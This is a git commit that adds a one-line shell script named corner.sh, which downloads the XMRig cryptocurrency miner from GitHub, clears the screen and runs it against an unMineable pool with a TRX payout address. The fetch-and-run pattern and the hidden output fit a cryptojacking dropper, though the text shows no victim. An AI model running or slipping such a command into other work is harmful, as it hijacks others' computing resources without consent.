8972b0b791555e5bb003dfaf4c3455a241941a57
benenw <140652447+benenw@users.noreply.github.com>
2023-07-27 19:49:07 +0100

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TTy3cv42XpRKhkQKH9xLSywd43kzQrgmhh.WORKERNAME -p x
